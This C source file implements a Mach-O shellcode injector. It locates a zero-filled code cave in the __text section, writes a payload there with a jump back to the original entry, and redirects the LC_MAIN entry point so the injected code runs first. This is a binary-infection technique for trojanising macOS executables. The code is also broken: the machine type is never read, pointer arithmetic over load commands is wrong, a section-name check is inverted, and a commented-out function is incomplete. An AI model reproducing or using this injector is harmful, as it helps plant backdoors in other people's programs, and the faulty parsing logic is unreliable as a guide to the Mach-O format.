#include "macho.h"
/*int MACH_O_sig_remove(char *file){
int i;
unsigned long long size;
uint32_t magic;
char *mach_o = load_file(file, &size)
memcpy(&magic,mach_o,sizeof(uint32_t));
if(magic==0xFEEDFACE){
   mach_header *hdr32
}
if(magic==0xFEEDFACF){


}
}*/
int MACH_O_inject(char *file,char *shellcode,int shellcode_len){
int i;
uint32_t size;
uint32_t machine_type;
uint32_t oryginal_entry;
uint32_t vaddr;

load_command *load;
entry_point_command *entry;

char *mach_o = load_file(file,&size);
if(machine_type==0xFEEDFACE){
mach_header *mach_hdr32 = (mach_header*)mach_o;
segment_command *seg32;
segment_command *text_seg32;
section *sec32;
load = (load_command*) (mach_o + sizeof(mach_header));
for( i = 0 ; i < mach_hdr32->ncmds ; i++){
if(load->cmd ==LC_SEGMENT){
seg32 = (segment_command*) load;
if(strcmp(seg32->segname,"__TEXT")==0){
    text_seg32 = seg32;

}
}
if(load->cmd == LC_MAIN ){
entry = (entry_point_command*)load;
}
    load = (load_command *)(load + load->cmdsize );
}
sec32 = (section *)(text_seg32 + sizeof(segment_command));
    for(i = 0 ; i < text_seg32->nsec ; i++)
    {
        if (strcmp(sec32->secname,"__text" ))
        break;
        sec32++;
    }
    unsigned long offset = sec32->fileoff;
    uint32_t count = 0;
for ( i = 0 ; i < sec32->filesize ; i++){
   if(mach_o[offset] == 0x00){
     offset +=1;
     count +=1;
     if (count == (shellcode_len+5)){

        offset -=count;
        vaddr = sec32->addr + (offset - sec32->fileoff);
        oryginal_entry = text_seg32->vmaddr + entry->entry_off;
        entry->entry_off = (offset - text_seg32->fileoff );

        char *payload =  apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);
        write_data(file,0,mach_o,size);
        write_data(file,offset,payload,count);
        free(payload);
        free(mach_o);
        return 0;
     }
   }
   else{
    offset +=1;
    count = 0;
   }

}
}
if(machine_type==0xFEEDFACF){
    mach_header_64 *mach_hdr64 = (mach_header_64*)mach_o;
    segment_command_64 *seg64;
    segment_command_64 *text_seg64;
    section_64 *sec64;

    load = (load_command*) (mach_o + sizeof(mach_header_64));
    for( i = 0 ; i < mach_hdr64->ncmds ; i++){
    if(load->cmd ==LC_SEGMENT_64){
    seg64 = (segment_command_64*) load;
    if(strcmp(seg64->segname,"__TEXT")==0){
        text_seg64 = seg64;

    }
    }
    if(load->cmd == LC_MAIN ){
    entry = (entry_point_command*)load;
    }
        load = (load_command *)(load + load->cmdsize );
    }
    sec64 = (section_64 *)(text_seg64 + sizeof(segment_command_64));
        for(i = 0 ; i < text_seg64->nsec ; i++)
        {
            if (strcmp(sec64->secname,"__text" ))
            break;
            sec64++;
        }
        unsigned long offset = sec64->fileoff;
        uint32_t count = 0;
    for ( i = 0 ; i < sec64->filesize ; i++){
       if(mach_o[offset] == 0x00){
         offset +=1;
         count +=1;
         if (count == (shellcode_len+5)){

            offset -=count;
            vaddr = sec64->addr + (offset - sec64->fileoff);
            oryginal_entry = text_seg64->vmaddr + entry->entry_off;
            entry->entry_off = (offset - text_seg64->fileoff );

            char *payload =  apply_suffix(shellcode,shellcode_len,oryginal_entry,vaddr);
            write_data(file,0,mach_o,size);
            write_data(file,offset,payload,count);
            free(payload);
            free(mach_o);
            return 0;
         }
       }
       else{
        offset +=1;
        count = 0;
       }

    }


}

return -1;
}

